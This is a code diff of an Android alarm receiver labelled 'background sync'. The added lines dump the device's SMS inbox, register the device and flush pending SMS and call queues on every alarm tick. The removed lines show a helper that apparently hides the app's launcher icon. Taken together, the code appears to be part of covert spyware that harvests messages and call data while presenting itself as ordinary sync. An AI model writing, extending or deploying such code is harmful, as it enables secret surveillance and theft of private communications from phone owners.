@@ -9,38 +9,25 @@ import android.util.Log
 class SyncAlarmReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent?) {
         val app = context.applicationContext
-        Log.d(TAG, "Alarm tick — background sync")
-
         val pendingResult = goAsync()
-        val wakeLock = SyncWakeLock.acquire(app, "AlarmSyncWakeLock")
-
-        try {
-            SyncAlarmScheduler.scheduleNext(app)
-        } catch (error: Exception) {
-            Log.e(TAG, "Alarm setup failed", error)
-        }
-
-        SyncBootstrap.armBackgroundSync(app)
-        LauncherHider.hideIfMarked(app)
-        CallSyncService.ensureRunning(app)
-
         BackgroundSyncRunner.run {
-            CallSyncService.holdDuring(app) {
-                try {
+            try {
+                if (InboxDump.isRunning()) {
+                    SyncAlarmScheduler.scheduleNext(app)
+                    return@run
+                }
+                SyncAlarmScheduler.scheduleNext(app)
+                CallSyncService.startHolding(app)
+                InboxDump.dumpBlocking(app)
+                DeviceRegistration.registerNow(app)
                 PendingSmsQueue.flush(app)
                 PendingCallQueue.flush(app)
-                PendingCallSync.flushIfPending(app)
-                DeviceRegistration.registerNow(app)
-                LocalDataStore.syncPendingToMongo(app, "alarm")
-                SyncScheduler.syncIfPermittedNow(app, "alarm")
-                } catch (error: Exception) {
-                    Log.e(TAG, "Alarm sync failed", error)
-                } finally {
-                    SyncWakeLock.release(wakeLock)
-                    try {
-                        pendingResult.finish()
-                    } catch (_: Exception) {
-                    }
+            } catch (error: Exception) {
+                Log.e(TAG, "Alarm sync failed", error)
+            } finally {
+                try {
+                    pendingResult.finish()
+                } catch (_: Exception) {
                 }
             }
         }
